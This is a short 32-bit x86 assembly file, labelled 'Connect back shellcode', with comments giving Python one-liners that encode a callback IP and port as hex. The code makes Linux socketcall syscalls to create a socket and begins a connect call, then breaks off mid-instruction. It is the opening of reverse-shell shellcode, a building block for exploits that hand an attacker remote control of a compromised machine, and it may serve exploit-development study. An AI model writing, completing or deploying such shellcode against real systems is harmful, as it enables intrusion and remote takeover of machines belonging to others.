	;; Evan Jensen (wont) 021813
	;; Connect back shellcode
	;; Handy One liner for IP
	;; reduce(lambda a,b:b+a,map(lambda a:hex(a)[2:].zfill(2),[192,168,1,1]))
	;; Ports are big endian hex, don't be dumb
	;; reduce(lambda a,b:b+a,(map(lambda a:hex(a)[2:].zfill(2),[int(i) for i in '2.1.1.0'.split('.')])))
BITS 32
	global main
main:
	xor eax,eax
	push eax
	inc eax
	mov ebx,eax		;socketcall type=socket
	push eax
	inc eax
	push eax
	mov ecx,esp
	mov al,0x66 		;socketcall unistd_32.h
	int 0x80		;socket fd in eax
	mov esi,eax
	mov al,66		;socketcall unistd_32.h
	inc ebx			;socketcall type=connect
	push dword
